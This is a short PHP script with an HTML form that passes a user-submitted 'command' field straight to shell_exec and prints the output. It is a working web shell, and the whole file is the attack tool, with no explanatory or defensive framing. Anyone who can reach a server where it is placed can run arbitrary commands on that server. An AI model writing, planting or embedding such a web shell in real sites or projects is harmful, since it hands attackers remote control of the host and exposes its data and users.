<?php

	if(isset($_POST['command']))
	{
		$command = $_POST['command'];
		$result = shell_exec($command);
		echo "<pre>".$result."</pre>";
	}

?>

<form method="post">
	<p>
		Command: <input type="text" name="command"/>
	</p>
	<input type="submit" value="Execute"/>
</form>